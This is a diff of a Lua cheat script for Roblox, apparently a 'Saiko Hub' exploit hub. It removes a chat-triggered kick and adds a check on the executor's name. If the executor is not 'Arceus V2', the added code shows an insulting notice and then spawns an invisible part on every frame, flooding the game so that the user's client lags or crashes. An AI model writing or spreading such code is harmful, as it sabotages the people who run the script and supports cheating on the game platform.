@@ -7,17 +7,22 @@ for i,v in pairs(Players:GetPlayers()) do
         game:GetService("TeleportService"):Teleport(5373028495, game:GetService("Players").LocalPlayer)
     end 
 end
-local Players = game:GetService("Players")
 
-Players.PlayerAdded:Connect(function(player)
- player.Chatted:Connect(function(raw_msg)
-  local msg = raw_msg:lower()
-
-  if msg == "hi321123" then
-  player:Kick()
-end
- end)
+if identifyexecutor() ~= 'Arceus V2' then
+game.StarterGui:SetCore("SendNotification", {
+Title = "Saiko Hub"; -- the title (ofc)
+Text = "gtfo with this virus"; -- what the text says (ofc)
+--Icon = "rbxassetid://57254792"; -- the image if u want. 
+Duration = 5; -- how long the notification should in secounds
+})
+wait(5)
+game:GetService('RunService').Heartbeat:Connect(function()
+local nerd = Instance.new("Part", workspace)
+nerd.Transparency = 1
+nerd.CFrame = CFrame.new(9,9,9)
 end)
+end
+
 game.StarterGui:SetCore("SendNotification", {
 Title = "Saiko Hub"; -- the title (ofc)
 Text = "3.5"; -- what the text says (ofc)
